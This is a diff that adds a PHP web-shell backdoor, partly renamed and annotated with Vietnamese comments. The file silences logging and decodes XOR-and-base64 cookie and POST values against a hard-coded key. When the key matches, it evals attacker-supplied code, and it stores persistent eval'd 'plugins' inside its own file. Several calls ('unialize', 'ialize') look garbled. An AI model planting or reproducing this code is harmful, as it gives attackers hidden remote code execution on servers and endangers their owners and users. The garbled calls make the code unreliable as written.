@@ -1,0 +1,228 @@
+<?php
+if (!defined('stream_context_create '))
+{
+    define('stream_context_create ', 1);
+    @ini_set('error_log', NULL);
+    @ini_set('log_errors', 0);
+    @ini_set('max_execution_time', 0);
+    @error_reporting(0);
+    @set_time_limit(0);
+    if(!defined("PHP_EOL"))
+    {
+        define("PHP_EOL", "\n");
+    }
+    if(!defined("DIRECTORY_SEPARATOR"))
+    {
+        define("DIRECTORY_SEPARATOR", "/");
+    }
+    if (!defined('file_put_contents '))
+    {
+        
+        //                                                                        -> 3
+        // main -> funtion3 -> function1 | -> 7 -> 5 -> func_trimed   | -> 8 -> 5 -> func_trimed | -> 9
+        //                               |                            |                          |
+        //                  -> function2 |            -> 3            |      -> 6 -> 4 -> 2      |
+        //                                                                        -> func_trimed |      
+        
+        
+        define('file_put_contents ', 1);
+        $Key = '816291f4-e264-4109-b4a2-56b0ccc91819';
+        global $Key;
+        
+        function Function1($str) {
+            if (strlen($str) < 4)  // kiem tra chieu dai chuoi truyen vao
+            {
+                return "";
+            }
+            
+            $String1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+            $String2 = str_split($String1);  // chuyen chuoi thành mảng kí tự
+            $String2 = array_flip($String2); // đổi key và value cho nhau trong mảng (key thành value và value thành key)
+            
+            $count = 0;
+            
+            $string3 = "";
+            
+            $str = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $str); // thay thế chuỗi giống trong regex bằng ""
+            
+            do {
+                $str4 = $String2[$str[$count++]];
+                $str5 = $String2[$str[$count++]];
+                $str6 = $String2[$str[$count++]];
+                $str7 = $String2[$str[$count++]];
+                $str8 = ($str4 << 2) | ($str5 >> 4);
+                $str9 = (($str5 & 15) << 4) | ($str6 >> 2);
+                $str10 = (($str6 & 3) << 6) | $str7;
+                $string3 = $string3 . chr($str8);
+                if ($str6 != 64) {
+                    $string3 = $string3 . chr($str9);
+                }
+                if ($str7 != 64) {
+                    $string3 = $string3 . chr($str10);
+                }
+            } while ($count < strlen($str));
+            return $string3;
+        }
+        
+        if (!function_exists('file_put_contents'))
+        {
+            function file_put_contents($arg1, $arg2, $arg3 = False)
+            {
+                $str11 = $arg3 == 8 ? 'a' : 'w';
+                $str12 = @fopen($arg1, $str11);
+                if ($str12 === False)
+                {
+                    return 0;
+                }
+                else
+                {
+                    if (is_array($arg2)) $arg2 = implode($arg2);
+                    $str13 = fwrite($str12, $arg2);
+                    fclose($str12);
+                    return $str13;
+                }
+            }
+        }
+        if (!function_exists('file_get_contents'))
+        {
+            function file_get_contents($arg4)
+            {
+                $countbyqpvqf = fopen($arg4, "r");
+                $pbzoorja = fread($countbyqpvqf, filesize($arg4));
+                fclose($countbyqpvqf);
+                return $pbzoorja;
+            }
+        }
+        
+        function Func_trimed()
+        {
+            return trim(preg_replace("/\(.*\$/", '', __FILE__));  // output : __FILE__
+        }
+        
+        function Function2($str2, $str3) 
+        {
+            $xxjfzjnt = "";
+            for ($count=0; $count<strlen($str2);)
+            {
+                for ($tamnin=0; $tamnin<strlen($str3) && $count<strlen($str2); $tamnin++, $count++)
+                {
+                    $xxjfzjnt .= chr(ord($str2[$count]) ^ ord($str3[$tamnin]));
+                }
+            }
+            return $xxjfzjnt;
+        }
+        
+        function Function3($str2, $str3)  
+        {
+            global $Key;
+            return Function2(Function2($str2, $str3), $Key);
+        }
+        
+        function Function4($str2, $str3)
+        {
+            global $Key;
+            return Function2(Function2($str2, $Key), $str3);
+        }
+        
+        function Function5()
+        {
+            $string4 = @file_get_contents(Func_trimed()); // đọc nội dung file chuyển thành chuỗi
+            $stt = strpos($string4, md5(Func_trimed())); 
+            // strpos tra ve sô thứ tự đầu tiên xuất hiện  của md5  của c huoi trong file 
+            if ($stt !== FALSE) 
+            {
+                $string5 = substr($string4, $stt + 32); //trích ra từ vị trí thứ stt+32 đến cuối
+                $string6 = @unialize(Function3(rawurldecode($string5), md5(Func_trimed())));
+            }
+            else
+            {
+                $string6 = Array();
+            }
+            return $string6;
+        }
+        function Function6($string6)
+        {
+            $gpmqsfs = rawurlencode(Function4(@ialize($string6), md5(Func_trimed())));
+            $string4 = @file_get_contents(Func_trimed());
+            $stt = strpos($string4, md5(Func_trimed()));
+            if ($stt !== FALSE)
+            {
+                $str12ojfgw = substr($string4, $stt + 32);
+                $string4 = str_replace($str12ojfgw, $gpmqsfs, $string4);
+            }
+            else
+            {
+                $string4 = $string4 . "\n\n//" . md5(Func_trimed()) . $gpmqsfs;
+            }
+            @file_put_contents(Func_trimed(), $string4);
+        }
+        function Function7($ooxpeye, $countreobd)
+        {
+            $string6 = Function5();
+            $string6[$ooxpeye] = Function1($countreobd);
+            Function6($string6);
+        }
+        function Function8($ooxpeye)
+        {
+            $string6 = Function5();
+            unset($string6[$ooxpeye]);
+            Function6($string6);
+        }
+        
+        function Function9($ooxpeye=NULL)
+        {
+            foreach (Function5() as $egstluwh=>$mjgwrcbk)
+            {
+                if ($ooxpeye)
+                {
+                    if (strcmp($ooxpeye, $egstluwh) == 0)
+                    {
+                        eval($mjgwrcbk);
+                        break;
+                    }
+                }
+                else
+                {
+                    eval($mjgwrcbk);
+                }
+            }
+        }
+        
+        foreach (array_merge($_COOKIE, $_POST) as $str1 => $str2) // nối vào cùng 1 mảng
+        {
+            $str2 = @unialize(Function3(Function1($str2), $str1));
+            if (isset($str2['ak']) && $Key==$str2['ak'])
+            {
+                if ($str2['a'] == 'i')
+                {
+                    $count = Array(
+                        'pv' => @phpversion(),
+                        'sv' => '2.0-1',
+                        'ak' => $str2['ak'],
+                    );
+                    echo @ialize($count);
+                    exit;
+                }
+                elseif ($str2['a'] == 'e')
+                {
+                    eval($str2['d']);
+                }
+                elseif ($str2['a'] == 'plugin')
+                {
+                    if($str2['sa'] == 'add')
+                    {
+                        Function7($str2['p'], $str2['d']);
+                    }
+                    elseif($str2['sa'] == 'rem')
+                    {
+                        Function8($str2['p']);
+                    }
+                }
+                echo $str2['ak'];
+                exit();
+            }
+        }
+        Function9();
+    }
+}    
+      
